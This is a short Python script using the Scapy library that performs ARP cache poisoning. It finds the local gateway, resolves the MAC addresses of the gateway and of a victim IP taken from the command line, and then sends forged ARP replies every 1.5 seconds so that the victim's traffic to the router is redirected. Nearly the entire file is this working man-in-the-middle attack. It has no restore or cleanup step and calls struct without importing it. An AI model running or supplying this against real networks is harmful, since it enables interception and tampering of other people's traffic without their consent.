#!/usr/bin/python
from scapy.all import *
import socket
import argparse
import signal
import sys
import logging
import time
import os
import re
import threading

def gate_way():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
#
def mac(ip):
        arpRequest = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
        arpRequest.show()
     
        arpRespone = srp1(arpRequest, timeout=1,verbose=0, retry=0, multi=0)
        if arpRespone:
                return arpRespone.hwsrc


def doc(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))


vIP = sys.argv[1]
vMAC = mac(vIP)
rIP = gate_way()
rMAC = mac(rIP)

print vIP
print vMAC
print rIP
print rMAC

while 1:
    doc(rIP, vIP, rMAC, vMAC)
    time.sleep(1.5)